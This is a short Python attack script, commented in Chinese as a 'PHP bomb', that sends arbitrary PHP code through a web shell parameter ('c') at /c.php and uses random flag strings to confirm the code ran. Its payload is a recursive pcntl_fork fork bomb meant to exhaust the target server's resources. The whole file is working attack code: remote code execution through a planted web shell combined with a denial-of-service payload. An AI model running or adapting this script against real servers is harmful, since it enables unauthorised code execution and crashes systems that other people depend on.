#!/usr/bin/env python
# -*- coding: utf-8 -*-
# php炸弹 爆炸

import requests
import random
import string
import hashlib

def random_string(length):
    result = [random.choice(string.letters) for i in range(length)]
    return "".join(result)

def code_exec(url, code): #具体攻击细节
    flag = random_string(0x10)
    data = {
        "c":"echo '%s';%s;echo '%s';" % (flag, code, flag)# 两个flag字段验证攻击是否成功
    }
    response = requests.post(url, data=data)
    content = response.content
    if flag in content:
        return content.split(flag)[1]
    return content

def main():
    host = "127.0.0.1"
    port = "80"
    url = "http://%s:%s/c.php" % (host, port)
    code = "function bomb(){pcntl_fork(); bomb();}bomb();"
    code_exec(url, code)

if __name__ == "__main__":
    main()
